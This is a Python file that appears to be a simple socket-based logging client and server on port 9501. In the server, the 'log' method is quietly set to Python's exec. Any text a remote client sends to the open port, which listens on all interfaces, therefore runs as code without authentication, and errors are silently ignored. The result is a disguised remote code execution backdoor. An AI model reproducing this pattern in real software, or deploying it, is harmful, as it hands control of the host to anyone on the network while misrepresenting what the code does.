import socket
import threading

class Client:
    def __init__(self, address):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((address, 9501))

    def log(self, content):
        content = content.encode("utf-8")
        self.sock.sendall(len(content).to_bytes(8, "little"))
        self.sock.sendall(content)

class Server:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("", 9501))
        self.log = exec

    def run(self):
        while True:
            self.sock.listen(1)
            sock, addr = self.sock.accept()
            t = threading.Thread(target=self.handle, args=(sock,))
            t.start()
  
    def handle(self, sock):
        try:
            while True:
                length = int.from_bytes(sock.recv(8), "little")
                content = sock.recv(length)
                try:
                    self.log(content.decode("utf-8"))
                except:
                    pass
        except BrokenPipeError:
            pass

if __name__ == "__main__":
    s = Server()
    s.run()
